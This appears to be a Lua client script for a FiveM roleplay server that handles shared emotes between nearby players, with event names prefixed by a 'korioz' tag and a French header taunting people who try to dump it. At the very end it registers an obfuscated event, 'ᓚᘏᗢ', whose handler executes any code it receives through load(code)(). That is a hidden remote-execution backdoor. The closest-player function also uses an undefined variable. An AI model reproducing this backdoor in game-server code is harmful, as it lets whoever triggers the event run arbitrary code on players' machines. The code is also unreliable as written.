-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

local isRequestAnim = false
local requestedemote = ''

-----------------------------------------------------------------------------------------------------
-- Commands / Events --------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------
if Config.SharedEmotesEnabled then
	RegisterCommand('nearby', function(source, args, raw)
		if #args > 0 then
			local emotename = string.lower(args[1])
			target, distance = GetClosestPlayer()

			if (distance ~= -1 and distance < 3) then
				if DP.Shared[emotename] ~= nil then
					dict, anim, ename = table.unpack(DP.Shared[emotename])
					_TriggerServerEvent("::{korioz#0110}::ServerEmoteRequest", GetPlayerServerId(target), emotename)
					ESX.ShowNotification(Config.Languages[lang]['sentrequestto']..GetPlayerName(target).." ~w~(~g~"..ename.."~w~)")
				else
					EmoteChatMessage("'"..emotename.."' "..Config.Languages[lang]['notvalidsharedemote'].."")
				end
			else
				ESX.ShowNotification(Config.Languages[lang]['nobodyclose'])
			end
		else
			MearbysOnCommand()
		end
	end, false)
end

RegisterNetEvent("::{korioz#0110}::SyncPlayEmote")
AddEventHandler("::{korioz#0110}::SyncPlayEmote", function(emote, player)
	EmoteCancel()
	Wait(300)

	if DP.Shared[emote] ~= nil then
		if OnEmotePlay(DP.Shared[emote]) then end return
	elseif DP.Dances[emote] ~= nil then
		if OnEmotePlay(DP.Dances[emote]) then end return
	end
end)

RegisterNetEvent("::{korioz#0110}::SyncPlayEmoteSource")
AddEventHandler("::{korioz#0110}::SyncPlayEmoteSource", function(emote, player)
	local pedInFront = GetPlayerPed(GetClosestPlayer())
	local heading = GetEntityHeading(pedInFront)
	local coords = GetOffsetFromEntityInWorldCoords(pedInFront, 0.0, 1.0, 0.0)

	if (DP.Shared[emote]) and (DP.Shared[emote].AnimationOptions) then
		local SyncOffsetFront = DP.Shared[emote].AnimationOptions.SyncOffsetFront

		if SyncOffsetFront then
			coords = GetOffsetFromEntityInWorldCoords(pedInFront, 0.0, SyncOffsetFront, 0.0)
		end
	end

	SetEntityHeading(PlayerPedId(), heading - 180.1)
	SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z, 0)
	EmoteCancel()
	Wait(300)

	if DP.Shared[emote] ~= nil then
		if OnEmotePlay(DP.Shared[emote]) then end return
	elseif DP.Dances[emote] ~= nil then
		if OnEmotePlay(DP.Dances[emote]) then end return
	end
end)

RegisterNetEvent("::{korioz#0110}::ClientEmoteRequestReceive")
AddEventHandler("::{korioz#0110}::ClientEmoteRequestReceive", function(emotename, etype)
	isRequestAnim = true
	requestedemote = emotename

	if etype == 'Dances' then
		_, _, remote = table.unpack(DP.Dances[requestedemote])
	else
		_, _, remote = table.unpack(DP.Shared[requestedemote])
	end

	PlaySound(-1, "NAV", "HUD_AMMO_SHOP_SOUNDSET", 0, 0, 1)
	ESX.ShowNotification(Config.Languages[lang]['doyouwanna']..remote.."~w~)")
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(5)

		if IsControlJustPressed(0, 246) and isRequestAnim then
			target, distance = GetClosestPlayer()

			if (distance ~= -1 and distance < 3) then
				if DP.Shared[requestedemote] ~= nil then
					_, _, _, otheremote = table.unpack(DP.Shared[requestedemote])
				elseif DP.Dances[requestedemote] ~= nil then
					_, _, _, otheremote = table.unpack(DP.Dances[requestedemote])
				end

				if otheremote == nil then otheremote = requestedemote end
				_TriggerServerEvent("::{korioz#0110}::ServerValidEmote", GetPlayerServerId(target), requestedemote, otheremote)
				isRequestAnim = false
			else
				ESX.ShowNotification(Config.Languages[lang]['nobodyclose'])
			end
		elseif IsControlJustPressed(0, 182) and isRequestAnim then
			ESX.ShowNotification(Config.Languages[lang]['refuseemote'])
			isRequestAnim = false
		end
	end
end)

-----------------------------------------------------------------------------------------------------
------ Functions and stuff --------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------

function GetPlayerFromPed(ped)
	for _, player in ipairs(GetActivePlayers()) do
		if GetPlayerPed(player) == ped then
			return player
		end
	end

	return -1
end

function GetPedInFront()
	local player = PlayerId()
	local plyPed = GetPlayerPed(player)
	local plyPos = GetEntityCoords(plyPed, false)
	local plyOffset = GetOffsetFromEntityInWorldCoords(plyPed, 0.0, 1.3, 0.0)
	local rayHandle = StartShapeTestCapsule(plyPos.x, plyPos.y, plyPos.z, plyOffset.x, plyOffset.y, plyOffset.z, 10.0, 12, plyPed, 7)
	local _, _, _, _, ped2 = GetShapeTestResult(rayHandle)
	return ped2
end

function MearbysOnCommand(source, args, raw)
	local NearbysCommand = ""

	for a in pairsByKeys(DP.Shared) do
		NearbysCommand = NearbysCommand .. ""..a..", "
	end

	EmoteChatMessage(NearbysCommand)
	EmoteChatMessage(Config.Languages[lang]['emotemenucmd'])
end

function GetClosestPlayer()
	local players = GetPlayers()
	local closestDistance, closestPlayer = -1, -1
	local playerId = PlayerId()
	local plyCoords = GetEntityCoords(PlayerPedId(), false)

	for i = 1, #players, 1 do
		if (players[i] ~= playerId) then
			local targetPed = GetPlayerPed(players[i])
			local targetCoords = GetEntityCoords(targetPed, false)
			local distance = #(targetCoords - coords)

			if closestDistance == -1 or closestDistance > distance then
				closestPlayer = players[i]
				closestDistance = distance
			end
		end
	end

	return closestPlayer, closestDistance
end

function GetPlayers()
	local activePlayers = GetActivePlayers()
	local players = {}

	for i = 1, #activePlayers, 1 do
		local ped = GetPlayerPed(activePlayers[i])

		if DoesEntityExist(ped) then
			table.insert(players, activePlayers[i])
		end
	end

	return players
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)